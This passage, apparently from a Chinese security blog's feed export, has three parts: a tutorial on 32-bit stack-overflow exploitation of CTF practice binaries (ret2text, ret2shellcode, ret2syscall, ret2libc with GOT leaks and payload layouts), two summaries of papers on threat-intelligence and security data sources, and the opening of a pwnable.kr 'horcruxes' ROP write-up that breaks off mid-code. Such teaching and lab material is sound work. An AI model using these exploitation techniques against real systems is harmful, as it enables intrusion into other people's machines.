start="5"><li>最后我们需要确定填入的padding长度，使得正好溢出到我们需要的位置，通过gdb和其插件动态调试可以获得，如图3.1.5调试信息可知，padding长度为108。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0smec9j30z20g6qa4.jpg" alt="img"></p><center>图3.1.5 gdb调试padding长度</center><ol start="6"><li>确定输入，由以上信息我们就能构造最后的输入，为108*’A’+p32(0xdeadbeaf)+p32(system_binsh_addr)。</li></ol><h3><span id="pret2shellcode">ret2shellcode</span><a href="#pret2shellcode" class="header-anchor">#</a></h3><p>shellcode是能让黑客获得shell的16进制机器码，当text段没有能获取shell的代码时，就需要我们自己想办法将shellcode放入内存中了。各种条件下的shellcode可以参考<a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">shellstorm</a>获得。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0rp24xj317002wgmh.jpg" alt="img"></p><center>图3.2.1 16进制shellcode</center><p>图3.2.1是一段16进制shellcode，对应的汇编代码如图3.2.2 所示。可以看到是将字符串/bin/sh\x00存入，再通过系统调用好获取shell。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0pxfjcj30ou0nuach.jpg" alt="img"></p><center>图3.2.2 shellcode汇编代码</center><p>分析与利用步骤：以附件中的ret2shellcode文件为例</p><ol><li>checksec查看程序保护机制，如图3.2.3所示，没有开启。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0wr67uj30l6084jub.jpg" alt="img"></p><center>图3.2.3 ret2shellcode 保护机制</center><ol start="2"><li>使用IDA查看main函数如图3.2.4所示，可以看到gets存在栈溢出问题，并且将s内容放到了.bss段的buf2内。由于.bss段具有可执行权限，所以我们可以将shellcode输入存在buf2中，再修改返回地址到buf2处执行。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0z49fqj30va0emtaa.jpg" alt="img"></p><center>图3.2.4 ret2shellcode main函数</center><ol start="3"><li>通过输入对栈布局如图3.2.5所示，由于存在拷贝，会将shellcode拷贝到buf2，再跳转到buf2执行shellcode即可。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0og4q1j30uy0aymy8.jpg" alt="img"></p><center>图3.2.5 ret2shellcode栈布局</center><ol start="4"><li><p>同ret2text一样确定padding长度为108。</p></li><li><p>构造输入为shellcode+(108-len(shellcode))+p32(0xdeadbeaf)+p32(buf2)即可。</p></li></ol><h3><span id="pret2syscall">ret2syscall</span><a href="#pret2syscall" class="header-anchor">#</a></h3><p>ret2syscall是指返回到系统调用执行。例如执行execve(‘/bin/sh’,0,0)获取shell。通过系统调用号，来调用系统函数，不使用libc中的函数，更加底层。在利用过程中，首先通过栈溢出和gadgets将寄存器置为需要的值，再使用int 0x80进行系统调用。</p><p>图3.3.1所示是execve(‘/bin/sh‘,0,0)对应汇编代码。可以看到从栈中取出了参数放入对应的寄存器，寄存器edx置0，ecx置0，ebx置为’/bin/sh’地址，在eax中存入系统调用号0xb。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0qrlt8j30pu0e8wg6.jpg" alt="img"></p><center>图3.3.1 execve获取shell的汇编代码</center><p>分析与利用步骤：以附件中的retsyscall程序为例</p><ol><li>checksec查看保护如图3.3.2 所示，未开启保护。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0tzt4bj30me08a3zh.jpg" alt="img"></p><center>图3.3.2 ret2syscall保护机制</center><ol start="2"><li>IDA打开查看main函数如图3.3.3所示，存在栈溢出。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0xpvrrj30ww0dmgn6.jpg" alt="img"></p><center>图3.3.3 ret2syscall main函数</center><ol start="3"><li>通过ROPgadgets工具能找到修改寄存器值，int 0x80，/bin/sh的gadgets地址如图3.3.4所示。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0x8vxej30o60583z1.jpg" alt="img"></p><center>图3.3.4 ret2syscall gadgets</center><ol start="4"><li>通过gadgets和栈溢出，就能构造栈布局进行利用了，如图3.3.5所示。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0wb4opj30xm0ikgnf.jpg" alt="img"></p><center>图3.3.5 ret2syscall 栈布局</center><p>当函数返回时，首先会利用两个pop的gadgets及栈中数据，修改eax、ebx、ecx、edx寄存器的值，最后执行int 0x80，就能获得shell了。</p><ol start="5"><li>padding长度依旧为108，构造输入为</li></ol><p>108*’A’+p32(0xdeadbeaf)+p32(pop_eax_ret)+p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(binsh_address)+p32(int_0x80_addr)即可。</p><h3><span id="pret2libc">ret2libc</span><a href="#pret2libc" class="header-anchor">#</a></h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，会选择执行 system(&quot;/bin/sh&quot;)，故而需要知道 system 函数的地址。可以分为以下三种情况：</p><ul><li>类型1：有”/bin/sh”，有system函数</li><li>类型2：没有”/bin/sh”，有system函数</li><li>类型3：没有”/bin/sh”，没有system函数</li></ul><h4><span id="plei-xing-1-you-bin-sh-you-system-han-shu">类型1：有”/bin/sh”，有system函数</span><a href="#plei-xing-1-you-bin-sh-you-system-han-shu" class="header-anchor">#</a></h4><p>分析与利用步骤：以附件中的ret2libc1文件为例</p><ol><li>checksec查看ret2libc1保护如图3.4.1所示，开启了NX保护。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0vvu6nj30mw092my4.jpg" alt="img"></p><center>图3.4.1 ret2libc1 保护机制</center><ol start="2"><li>IDA查看main函数，可以看到存在栈溢出漏洞，如图3.4.2所示。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n11kl93j30xy0bm75h.jpg" alt="img"></p><center>图3.4.2 ret2libc1 main函数</center><ol start="3"><li><p>使用ROPgadget工具，在程序中能够找到/bin/sh字符串地址binsh_address，且在程序的plt表中能够找到system函数地址system_plt_address，即为第一类。</p></li><li><p>通过栈溢出布局，由于我们知道字符串地址和system在plt表中地址，所以不需要泄露libc基址。如图3.4.3所示，覆盖返回地址为system_plt_address，并放入参数为/bin/sh地址即可。</p></li><li><p>同前，padding长度为108，构造输入为:</p></li></ol><p>’A’*108+p32(0xdeadbeaf)+p32(system_plt_address)+p32(0xdeadbeaf)+p32(binsh_address)</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n12xaf9j30vc0bimyg.jpg" alt="img"></p><center>图3.4.3 ret2libc1 栈布局</center><h4><span id="plei-xing-2-mei-you-bin-sh-you-system-han-shu">类型2：没有”/bin/sh”，有system函数</span><a href="#plei-xing-2-mei-you-bin-sh-you-system-han-shu" class="header-anchor">#</a></h4><p>分析与利用步骤：以附件中ret2libc2文件为例</p><ol><li>checksec查看保护机制，如图3.4.4所示，只开启了NX保护</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0n76hqj30qo08sjsd.jpg" alt="img"></p><center>图3.4.4 ret2libc2 保护机制</center><ol start="2"><li>IDA打开查看main函数，如图3.4.5所示，同样存在栈溢出漏洞。与ret2libc1不同的是，ret2libc2中不存在/bin/sh字符串，但是我们能在.bss段找到一个全局的buf2数组，长度为0x64。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n12haa2j30ug0b4tcm.jpg" alt="img"></p><center>图3.4.5 ret2libc2 main函数</center><ol start="3"><li><p>由于plt表中存在gets函数地址gets_plt和system函数地址system_plt，.bss段buf2数组地址为buf2_addr。因此利用可以分为两步，首先构造执行gets(buf2_addr)将/bin/sh字符串写入全局buf2中，再执行system(buf2_addr)达到目的。</p></li><li><p>经过上述分析，可以对栈布局如图3.4.6所示，在这里要注意，由于在程序执行中gets有一个参数，因此需要将其pop出去才能继续执行。</p></li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0ny3jaj313y05smxz.jpg" alt="img"></p><center>图3.4.6 ret2libc2 栈布局</center><ol start="5"><li>同样padding长度仍然为108，最后可以构造输入如下：</li></ol><p>108*’A’+p32(0xdeadbeaf)+p32(gets_plt)+p32(pop_ebx_ret)+p32(buf2_addr)+p32(system_plt)+p32(0xdeadbeaf)+p32(buf2_addr)</p><h4><span id="plei-xing-3-mei-you-bin-sh-mei-you-system-han-shu">类型3：没有”/bin/sh”，没有system函数</span><a href="#plei-xing-3-mei-you-bin-sh-mei-you-system-han-shu" class="header-anchor">#</a></h4><p>这一类的漏洞利用思路如下：</p><ul><li><p>system函数属于<code>libc.so</code>，在libc.so中的相对偏移是固定的</p></li><li><p>即使开启了ASRL保护，也不会改变加载地址的低12位</p></li><li><p>可以通过GOT表泄露已执行过的libc.so中的函数的地址</p></li><li><p>通过泄露的低12位找到libc.so版本，得到system函数和/bin/sh地址</p></li><li><p>ROP利用<br>分析与利用步骤：以附件中的ret2libc3文件为例</p></li></ul><p>1．checksec查看ret2libc3保护机制，如图3.4.7所示，只开启了NX保护</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0tb3tyj30pe08uwfh.jpg" alt="img"></p><center>图3.4.7 ret2libc3保护机制</center><ol start="2"><li>IDA打开查看main函数，如图3.4.8所示，存在栈溢出。存在gets和puts两个libc.so中的函数</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0uyia6j30xe0cimyn.jpg" alt="img"></p><center>图3.4.8 ret2libc3 main函数</center><ol start="3"><li>根据之前所说的利用思路，可以想到以下利用步骤：</li></ol><ul><li><p>第一次ROP：利用puts函数泄露__libc_start_main函数地址</p></li><li><p>通过低12位查找libc.so版本</p></li><li><p>得到实际的system函数和/bin/sh地址</p></li><li><p>第二次ROP：执行system(“/bin/sh”)</p></li></ul><p>这里我们需要让main函数执行两次，这样才能进行两次ROP</p><ol start="4"><li>第一次ROP栈布局如图3.4.9所示，返回时，先调用puts函数输出__libc_start_main函数地址，然后会进入第二次main函数的执行，得到了第二次ROP的机会</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0y6mfmj30v40bsdh1.jpg" alt="img"></p><center>图3.4.9 ret2libc3 第一次ROP栈布局</center><ol start="5"><li>通过泄露的__libc_start_main函数地址，可以得到system函数地址和/bin/sh地址，从而第二次ROP栈布局如图3.4.10所示，执行system(“/bin/sh”) 。</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ge2n0vfc0mj30te0c03zr.jpg" alt="img"></p><center>图3.4.10 ret2libc3 第二次ROP栈布局</center><p>在通过低12位查询libc.so版本时可以利用<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc版本数据库</a>， 以及其对于python的查询封装<a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">LibcSearcher</a>。</p>]]></content>
      <categories>
        <category>CTF</category>
        <category>pwn</category>
        <category>stack_overflow</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwn</tag>
        <tag>stack overflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Beyond Free Riding-Quality of Indicators for Assessing Participation in Information Sharing for Threat Intelligence</title>
    <url>/7160fe1c.html</url>
    <content><![CDATA[<blockquote><p>依然是态势感知作业需求</p></blockquote><h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><p>paper针对在威胁情报共享体系中，某些参与者为了获得共享情报，却又不给出实质性的贡献的情况（所谓搭便车），提出指标质量QoI来评估参与者的贡献，并引入了以下度量：正确性、相关性、实用性和唯一性。</p><p>采用基准方法定义了质量度量，然后获得了一个参考数据集，并利用机器学习文献中的工具进行质量评估。将这些结果与仅将信息量视为贡献度量的模型进行了比较，揭示了各种有趣的观察结果，发现低质量的参与者。</p><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>在建立共享体系过程中，参与者之间也存在着竞争关系，所以有的参与者只想加入但不想有实质性的贡献。所以有了作者的这个工作</p><h3><span id="pquality-of-indicators">Quality of Indicators</span><a href="#pquality-of-indicators" class="header-anchor">#</a></h3><p>一个定义良好的QoI系统能够区分参与者的贡献度，提高社区质量。由于在社区中，并不是强制性的要求共享，全凭意愿。因此我们需要一个稳健的评价系统，而不是预先定义信任。</p><h3><span id="pthe-simple-contribution-measures">The Simple Contribution Measures</span><a href="#pthe-simple-contribution-measures" class="header-anchor">#</a></h3><p>其他论文存在这个gap,因此确定QoI来捕捉搭便车现象存在必要。</p><p>仅仅通过成员贡献的数目来衡量贡献度是不够的，在以往的文献中未提出很好的贡献质量评价标准。</p><h3><span id="pfeatures-of-quality-of-indicators">Features of Quality of Indicators</span><a href="#pfeatures-of-quality-of-indicators" class="header-anchor">#</a></h3><p>已有的文献探讨过QoI和信息私密性（独家）、正确性（准确）、与社区成员的相关性（领域）、效用、唯一性（信息是否冗余）的关系。</p><p>除了以上，也有时效性指标。单独的使用一个指标是不够的，因此在本文中对其进行加权来评价这些指标的质量。</p><h3><span id="pcontribution">Contribution</span><a href="#pcontribution" class="header-anchor">#</a></h3><p>1、结果认为，在信息共享体系中，需要QoI来分析成员的贡献</p><p>2、制定了稳健的度量指标</p><p>3、通过实验演示了指标，展示了健壮性，以及它区分搭便车行为的能力</p><h2><span id="poverview-and-preliminaries">OVERVIEW AND PRELIMINARIES</span><a href="#poverview-and-preliminaries" class="header-anchor">#</a></h2><p>首先概述了网络威胁情报系统，然后介绍了这些系统中信息共享的独特问题，为了解决这些问题，需要采取质量评估。</p><h3><span id="pthe-threat-landscape">The Threat Landscape</span><a href="#pthe-threat-landscape" class="header-anchor">#</a></h3><p>主要讲了僵尸网络的威胁</p><h3><span id="pthe-need-for-threat-intelligence">The Need for Threat Intelligence</span><a href="#pthe-need-for-threat-intelligence" class="header-anchor">#</a></h3><p>主要是为了在被攻击前发现安全威胁。类似于银行没被抢之前就找到有意图的罪犯。</p><h3><span id="pthreat-intelligence-sharing">Threat Intelligence Sharing</span><a href="#pthreat-intelligence-sharing" class="header-anchor">#</a></h3><p>随着互联网的发展，威胁的增多，单个机构的力量很难解决所有问题。</p><p>通过威胁情报的共享，可以联合防御。</p><p>为了达成情报共享，就需要定义接口啥的来进行交换。（参考文献3、4、5定义了信息共享标准）</p><h3><span id="prisks-of-sharing">Risks of Sharing</span><a href="#prisks-of-sharing" class="header-anchor">#</a></h3><p>1、威胁信息的暴露，可能会被利用于攻击</p><p>2、泄露分享者的隐私信息等</p><p>3、参与者之间存在合作和竞争关系，一手情报不愿意分享</p><h3><span id="pformulation-of-the-free-riding-problem">Formulation of the Free-Riding Problem</span><a href="#pformulation-of-the-free-riding-problem" class="header-anchor">#</a></h3><p>定义搭便车行为：一些人是为了从共享信息系统获利而不是为了贡献，不肯提供有用的内容。</p><h3><span id="phow-quality-of-indicators-help">How Quality of Indicators Help</span><a href="#phow-quality-of-indicators-help" class="header-anchor">#</a></h3><p>这小段没啥信息量</p><h2><span id="pqoi-assessment-methodology">QOI ASSESSMENT METHODOLOGY</span><a href="#pqoi-assessment-methodology" class="header-anchor">#</a></h2><p>QoI度量包括指标相对于标签特征的正确性、指标与消费社区成员的相关性、指标的实用性及其唯一性。</p><h3><span id="pqoi-metrics">QoI Metrics</span><a href="#pqoi-metrics" class="header-anchor">#</a></h3><p>4个度量：</p><ul><li>正确性</li><li>相关性</li><li>实用性</li><li>唯一性</li></ul><h3><span id="psystem-architecture-amp-design">System Architecture &amp; Design</span><a href="#psystem-architecture-amp-design" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdwzsyczxtj30oi0gmtbx.jpg" alt="image-20200417193345604"></p><p>上图是大概的共享体系模型，在其中加入一个assessor，用于计算分享的信息的质量，打分</p><p>这里假设交换的信息真实且清晰可见，使用现有的信息交换协议，提供端到端的安全保证。</p><h3><span id="psystem-setup-and-steps">System Setup and Steps</span><a href="#psystem-setup-and-steps" class="header-anchor">#</a></h3><ol><li>定义评价指标和打分程序</li><li>定义威胁和质量标签的注释。注释可以是指示威胁类型的标签，也可以是用于标识指标的质量（严重性，及时性等）或质量类型的标签。利用这些注释，将权重值分配给每个质量标签，并使用计分方法将质量标签转换为指标的数字总得分。</li><li>构建参考数据集</li><li>训练分类器</li></ol><p>给定样本，用模型预测样本的标签，与参与者提供的标签对比是否匹配，结果记录为质量批注，计算置信度</p><p>整体过程如下如所示</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx0o0bejvj30xk0s2wj1.jpg" alt="image-20200417200338616"></p><h3><span id="pqoi-assessment-process-operation">QoI Assessment Process Operation</span><a href="#pqoi-assessment-process-operation" class="header-anchor">#</a></h3><p>训练使用有监督学习算法，整体过程包含特征选取、机器学习算法的选取、参数矫正（正则化等）、交叉验证</p><h2><span id="pqoi-assessment-procedures">QOI ASSESSMENT PROCEDURES</span><a href="#pqoi-assessment-procedures" class="header-anchor">#</a></h2><p>是对前面步骤的详细说明</p><h3><span id="preference-dataset-and-learning">Reference Dataset and Learning</span><a href="#preference-dataset-and-learning" class="header-anchor">#</a></h3><p>主要以VirusTotal作为参考，可信度高且信息量充足、其内容十分有用。</p><h3><span id="pextrapolation-and-benchmarking">Extrapolation and Benchmarking</span><a href="#pextrapolation-and-benchmarking" class="header-anchor">#</a></h3><p>在有了初始的参考后，需要考虑的是如何使用参考数据集来评估和推断指标的值和质量。在paper中使用半监督学习来解决这个问题。</p><p>分类模型：nearest centroid classifier （NCC）最近质心分类器</p><p>找了个图，大概这样</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx1omfionj311y0tsasi.jpg" alt="image-20200417203847952"></p><h3><span id="plabeling-and-quality-scoring">Labeling and Quality Scoring</span><a href="#plabeling-and-quality-scoring" class="header-anchor">#</a></h3><p>有了分类器，然后需要参与者给出提供信息的feature和label，就能进行预测和打分了。</p><h3><span id="pcorrectness">Correctness</span><a href="#pcorrectness" class="header-anchor">#</a></h3><p>计算正确性</p><p>如果预测出来的标签和参与者提供的标签匹配，就给一个正分数，然后最后加权平均得到结果分数</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx2fqpsgwj30w20u0te7.jpg" alt="image-20200417210450912"></p><h3><span id="prelevance">Relevance</span><a href="#prelevance" class="header-anchor">#</a></h3><p>计算相关度</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx2g25qofj30we0fcmzh.jpg" alt="image-20200417210511589"></p><p>对于公众更感兴趣的label，赋予更大的权值</p><h3><span id="putility">Utility</span><a href="#putility" class="header-anchor">#</a></h3><p>计算效用</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx2kyxsvij30we0j0n13.jpg" alt="image-20200417210955028"></p><h3><span id="puniqueness">Uniqueness</span><a href="#puniqueness" class="header-anchor">#</a></h3><p>计算唯一性</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx2n67dklj30ze0q8jvo.jpg" alt="image-20200417211201763"></p><h3><span id="pquality-of-indicator-qoi">Quality of Indicator (QoI)</span><a href="#pquality-of-indicator-qoi" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx2okow15j30xu0b8tak.jpg" alt="image-20200417211322722"></p><h2><span id="pevaluation-and-findings">EVALUATION AND FINDINGS</span><a href="#pevaluation-and-findings" class="header-anchor">#</a></h2><p>和传统的只看数量方法进行比较</p><h3><span id="pdataset-characteristics">Dataset Characteristics</span><a href="#pdataset-characteristics" class="header-anchor">#</a></h3><p>为了突出QoI作为评估威胁情报信息共享贡献的新概念，我较了基于质量和基于数量的评分方法对AV供应商贡献的差异。为此，我们的数据集列举了在2011年年中至2013年年中的数据收集期间，向VirusTotal提交恶意软件样本（包括标签）的AV供应商</p><p>评估的一个关键目标是证明在使用基于数量的分数计算的不足，因为一个供应商可以通过提交大量关于低质量恶意软件样本的信息来获得高评级。如前所述，这可能是由于以下几个原因造成的：提交的关于某些恶意软件样本的工件不正确，样本族不准确，或者提交的关于样本的信息类型无助于识别或检测它们。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx2t6vp71j30wa0l4wjd.jpg" alt="image-20200417211749490"></p><h3><span id="presult">Result</span><a href="#presult" class="header-anchor">#</a></h3><p>就是几个图，结论也很清楚</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx2vb5vm9j31rm0iwq75.jpg" alt="image-20200417211951538"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx2visobgj31oy0iy42r.jpg" alt="image-20200417212004229"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx2vo3ezmj31ts0iun1i.jpg" alt="image-20200417212012513"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx2vtwqhoj31tw0keq7r.jpg" alt="image-20200417212021833"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdx2vzrtbmj31sc0j2q76.jpg" alt="image-20200417212031407"></p><p>可以看到有很多公司在划水23333</p><h2><span id="pgan-xiang">感想</span><a href="#pgan-xiang" class="header-anchor">#</a></h2><p>虽然这个工作得出了有意思的结论，但其实存在一些不恰当的地方，在计算特征的时候，提到了权重，看样子都是作者自定义的，不太科学，更好的方法是通过使用ground truth，利用数值化的方法来计算出来（比如一般来说，我们知道出现次数越多的label一般是人们比较感兴趣的，可以通过计算频率来算权重，代替认为指定）。</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>security_situation_awareness</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>security situation awareness</tag>
      </tags>
  </entry>
  <entry>
    <title>An analysis and classification of public information securiy data sources used in research and practice</title>
    <url>/1ffe8215.html</url>
    <content><![CDATA[<blockquote><p>课程作业，选题数据质量评价方法，所以看了这篇文章</p></blockquote><h2><span id="pabstract">Abstract</span><a href="#pabstract" class="header-anchor">#</a></h2><p>是对当前公共信息安全数据源的分类与分析。对于信息安全数据来源多样且质量不一的情况进行研究分析，从六个维度进行分类和比较：(1) Type of information, (2) Integrability, (3) Timeliness, (4) Originality, (5) Type of Source,and (6) Trustworthiness。共收集和比较了68个公开的信息安全数据源，结果表明由于来源不同，数据异构繁多，加大了统一集成和使用的难度。</p><a id="more"></a><h2><span id="pintroduction">Introduction</span><a href="#pintroduction" class="header-anchor">#</a></h2><p>信息安全数据源：提供有关脆弱性、威胁、攻击、风险、受影响资产或可用对策的信息源</p><p>例如NVD、twitter的数据源等</p><p>当前研究gap：至今为止，对这些数据源的实证研究不多见，缺乏对这些数据源可用性、特征、依赖性和如何使用的系统且全面的概述。也没有对这些数据源的对比结果。</p><p>研究目标：对数据源进行分类，定性定量分析。</p><p>研究从以下三个问题入手：1、怎么分类；2、特征是什么；3、数据源之间有什么依赖关系</p><h2><span id="prelated-work">Related work</span><a href="#prelated-work" class="header-anchor">#</a></h2><ul><li>Steinberger et al. 分析现有用例，根据数据交换格式和协议，给出了结构化认识</li><li>Hernandez-Ardieta et al. 提出基于交换格式的实时信息安全数据共享模型</li><li>Rader and Wash 分析三类安全数据源：文章、网页、个人经历，发现主要内容为attack和结果</li><li>Massacci and Nguyen 分析14个漏洞库，比较信息格式</li><li>Tripathi and Singh 对几个漏洞库的漏洞分类方案进行分析，希望提出更高的分类方案</li><li>Tounsi and Rais 对不同的威胁情报类型进行了分类。关注新的标准、趋势和技术问题。</li><li>Mavroeidis and Bromander 对共享标准和策略进行分类</li><li>Zhao and White概述了信息安全数据共享的重要性，并提供了重要共享的信息安全数据类型列表。</li><li>…</li></ul><p>总结：目前的研究大多集中在信息安全数据交换或威胁情报共享方面，而对脆弱性数据库等信息安全数据源的分析研究还不多见。</p><h2><span id="presearch-methodology">Research methodology</span><a href="#presearch-methodology" class="header-anchor">#</a></h2><p>将问题2划分为很多子问题如下：</p><ul><li>2.1 数据源存在哪些特征</li><li>2.2 信息结构是什么</li><li>2.3 获取数据的接口是什么</li><li>2.4 谁提供了这些信息</li><li>2.5 信息分享的时间</li><li>2.6 提供的信息是最原始的信息吗</li></ul><p>问题3 划分：</p><ul><li>3.1 提供的不同类型的信息之间有什么关系</li><li>3.2 接口如何与提供的不同类型的信息相关？</li></ul><p>整体章节结构如下：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gduox3hb9pj318m0eqgqz.jpg" alt="image-20200415194603766"></p><h3><span id="pliterature-review">Literature Review</span><a href="#pliterature-review" class="header-anchor">#</a></h3><p>基于snowballing方法，方法步骤如下：</p><ul><li>定义文章的起始点集合</li><li>执行snowballing迭代（包括向前snowballing，例如确定引用被检查论文的新论文，以及向后snowballing，例如查看所考虑论文的参考文献）</li></ul><p>定义起始点：通过关键字搜索各大数据库获得对应的文章（遵从snowballing的5大原则）</p><p>迭代：前向后向各进行三十次迭代直到没有新的paper进入集合，通过引用和被引等信息，经过blabla最后选出了42份优质论文</p><h3><span id="pdata-collection-on-twitter">Data collection on twitter</span><a href="#pdata-collection-on-twitter" class="header-anchor">#</a></h3><p>利用关键词，使用爬虫爬和CVE有关的tweets，pattern匹配<code>CVE-\d{4}-\d{4}</code>，（现在这个pattern已经不够用了）</p><p>一共搜集到了20160523-20180327间的709880个tweets，平均每个tweet中有0.8个url指向了包含详细信息的网页。一共有11437个不同的详细信息链接，选取了其中的top50</p><h3><span id="pexploratory-survey">Exploratory survey</span><a href="#pexploratory-survey" class="header-anchor">#</a></h3><p>调研公共安全数据源的使用，通过问卷的方式对29个大公司进行调研：What public available information security data sources are you using as input to information security risk management processes?</p><p>让他们从87个备选数据源中挑选最常用的3个，然后最后根据调研选出了32个数据源</p><h3><span id="pselection-of-information-security-data-sources">Selection of information security data sources</span><a href="#pselection-of-information-security-data-sources" class="header-anchor">#</a></h3><p>从上面的42，50，32中选取开源、英语并且和attack、risk等相关的，其他的商用、非英语什么的丢掉</p><h3><span id="pdevelopment-of-classification-taxonomy">Development of classification taxonomy</span><a href="#pdevelopment-of-classification-taxonomy" class="header-anchor">#</a></h3><p>没用的章节</p><h3><span id="pclassification-and-analysis-of-information-security-data-sources">Classification and analysis of information security data sources</span><a href="#pclassification-and-analysis-of-information-security-data-sources" class="header-anchor">#</a></h3><p>好像也没什么用，总之是为了减小个人看法对分类结果的影响，分类也是人工分的</p><h2><span id="presults">Results</span><a href="#presults" class="header-anchor">#</a></h2><h3><span id="pclassification-taxonomy">Classification taxonomy</span><a href="#pclassification-taxonomy" class="header-anchor">#</a></h3><p>分类结果如下：</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gduqh6okbrj319c0owgs9.jpg" alt="image-20200415203957931"></p><p>根据信息类型 按照IEC2014划分为Vulnerability、Threat、Countermeasure、Attack、Risk、Asset</p><p>根据可集成性 按照IEC/ISO27005，描述了信息自动化聚集的程度，分为结构性的，非结构性的格式和接口等</p><p>根据及时性可以分为常规的日报月报和突发两种</p><p>根据独创性分为一手和二手资料</p><p>根据信息源类型分为 新闻网页、博客、安全产品网页、漏洞库、邮件、社交网络等</p><p>根据信赖程度分为 可信性、可追溯性、反馈机制</p><p>后面的东西与课程作业内容不是很相关所以就不看了，都是回答前面抛出的的questions</p><p>这六个分类维度和选题还算有点关系</p>]]></content>
      <categories>
        <category>papers</category>
        <category>security</category>
        <category>security_situation_awareness</category>
      </categories>
      <tags>
        <tag>paper</tag>
        <tag>security</tag>
        <tag>security situation awareness</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnable.kr —— horcruxes</title>
    <url>/62d14747.html</url>
    <content><![CDATA[<h2><span id="pquestion">question</span><a href="#pquestion" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Voldemort concealed his splitted soul inside 7 horcruxes.</span><br><span class="line">Find all horcruxes, and ROP it!</span><br><span class="line">author: jiwon choi</span><br><span class="line"></span><br><span class="line">ssh horcruxes@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure><a id="more"></a><h2><span id="panalyse">analyse</span><a href="#panalyse" class="header-anchor">#</a></h2><p>IDA打开看到ropme函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int ropme()</span><br><span class="line">&#123;</span><br><span class="line">  char s[100]; &#x2F;&#x2F; [esp+4h] [ebp-74h]</span><br><span class="line">  int v2; &#x2F;&#x2F; [esp+68h] [ebp-10h]</span><br><span class="line">  int fd; &#x2F;&#x2F; [esp+6Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Select Menu:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v2);</span><br><span class="line">  getchar();</span><br><span class="line">  if ( v2 &#x3D;&#x3D; a )</span><br><span class="line">  &#123;</span><br><span class="line">    A();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; b )</span><br><span class="line">  &#123;</span><br><span class="line">    B();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; c )</span><br><span class="line">  &#123;</span><br><span class="line">    C();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; d )</span><br><span class="line">  &#123;</span><br><span class="line">    D();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; e )</span><br><span class="line">  &#123;</span><br><span class="line">    E();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; f )</span><br><span class="line">  &#123;</span><br><span class="line">    F();</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( v2 &#x3D;&#x3D; g )</span><br><span class="line">  &#123;</span><br><span class="line">    